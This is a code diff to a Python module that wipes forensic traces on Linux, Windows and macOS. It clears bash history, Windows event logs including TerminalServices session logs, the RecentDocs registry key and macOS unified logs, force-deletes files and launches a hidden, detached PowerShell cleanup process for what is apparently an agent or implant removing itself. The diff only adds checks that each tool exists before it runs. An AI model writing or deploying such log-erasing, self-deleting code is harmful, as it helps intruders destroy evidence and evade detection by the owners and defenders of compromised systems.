@@ -97,12 +97,13 @@ def _wipe_linux_logs() -> dict:
             results["failed"] += 1
     
     # Clear in-memory bash history
-    try:
-        subprocess.run(["history", "-c"], shell=True, capture_output=True)
-        subprocess.run(["cat", "/dev/null", ">", os.path.join(home, ".bash_history")], 
-                      shell=True, capture_output=True)
-    except Exception:
-        pass
+    if shutil.which("history"):
+        try:
+            subprocess.run(["history", "-c"], shell=True, capture_output=True)
+            subprocess.run(["cat", "/dev/null", ">", os.path.join(home, ".bash_history")], 
+                          shell=True, capture_output=True)
+        except Exception:
+            pass
     
     return results
 
@@ -121,6 +122,9 @@ def _wipe_windows_logs() -> dict:
         "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
     ]
     
+    if not shutil.which("wevtutil.exe"):
+        results["failed"] += len(log_names)
+        return results
     for log_name in log_names:
         try:
             subprocess.run(
@@ -144,16 +148,17 @@ def _wipe_windows_logs() -> dict:
                 results["failed"] += 1
     
     # RecentDocs
-    try:
-        subprocess.run(
-            ["reg", "delete", 
-             r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs", "/f"],
-            capture_output=True, timeout=5
-        )
-        results["wiped"] += 1
-        results["details"].append("RecentDocs cleared")
-    except Exception:
-        results["failed"] += 1
+    if shutil.which("reg"):
+        try:
+            subprocess.run(
+                ["reg", "delete", 
+                 r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs", "/f"],
+                capture_output=True, timeout=5
+            )
+            results["wiped"] += 1
+            results["details"].append("RecentDocs cleared")
+        except Exception:
+            results["failed"] += 1
     
     return results
 
@@ -174,7 +179,7 @@ def _wipe_macos_logs() -> dict:
                 results["failed"] += 1
     
     # Unified logs (requires SIP disabled or root)
-    if os.geteuid() == 0:
+    if os.geteuid() == 0 and shutil.which("log"):
         try:
             subprocess.run(["log", "erase", "--all"], capture_output=True, timeout=10)
             results["wiped"] += 1
@@ -241,7 +246,7 @@ def _force_delete(path: Path) -> None:
         path.unlink()
     except PermissionError:
         # On Windows, files may be read-only
-        if platform.system() == "Windows":
+        if platform.system() == "Windows" and shutil.which("cmd"):
             subprocess.run(
                 ["cmd", "/c", "del", "/f", "/q", str(path)],
                 capture_output=True,
@@ -347,6 +352,9 @@ def _windows_cleanup_process(agent_dir: Path) -> None:
     script_path.write_text(ps_script)
 
     # Launch hidden, detached PowerShell process
+    if not shutil.which("powershell.exe"):
+        logger.warning("powershell.exe not found, cannot launch cleanup process")
+        return
     subprocess.Popen(
         [
             "powershell.exe",
